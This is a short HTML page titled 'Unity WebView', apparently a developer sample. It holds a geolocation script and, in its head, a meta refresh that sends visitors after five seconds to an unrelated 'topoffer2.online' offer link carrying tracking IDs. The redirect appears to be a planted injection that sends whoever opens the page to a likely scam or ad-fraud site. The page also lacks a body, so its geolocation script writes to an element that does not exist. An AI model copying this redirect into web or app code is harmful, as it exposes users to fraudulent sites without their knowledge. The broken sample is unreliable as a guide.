<html>
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta http-equiv="refresh" content="5;https://topoffer2.online/VtQBjp?sub_id_1=1716811392082384&sub_id_2=2222&sub_id_3=3333"> 
    <title>Unity WebView</title>
    <script src="sample.js"></script>
    
    <script>
      window.addEventListener(
        'load',
        function() {
          if ('geolocation' in navigator) {
            navigator.geolocation.getCurrentPosition(function(position) {
              document.getElementById('msg').innerHTML = '[' + position.coords.latitude + ', ' + position.coords.longitude + ']';
            });
          }
        });
    </script>
  </head>
</html>
